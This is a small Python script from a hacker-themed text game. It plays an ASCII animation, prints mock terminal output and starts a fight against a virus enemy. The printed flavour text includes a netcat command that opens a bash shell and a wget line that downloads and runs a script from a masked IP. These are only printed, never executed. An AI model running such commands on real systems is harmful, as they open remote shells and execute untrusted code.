import random as r
import os
from time import sleep
import hacking
import animation as a

a.animate_ascii(a.animation_frames)
print("nc -nvlp 1337 -e /bin/bash")
sleep(2.5)
print("/bin/sh$")
sleep(0.5)
print("/bin/sh$ cd /temp/ & wget http://135.xxx.xxx.xxx/omegaPwn.py -o omegaPwn.py & ./omegaPwn.py")
sleep(0.5)
print("You're in the mainframe. The elastic strap of your cyberViser is soaked through with inefficient human coolant.\n" \
"There's just one more layer of ICE to crack.\n" \
"Can you hack it, hacker?")
hacking.getFight(hacking.player, hacking.Enemy.virus)
nextMove = input("You lived. What next?")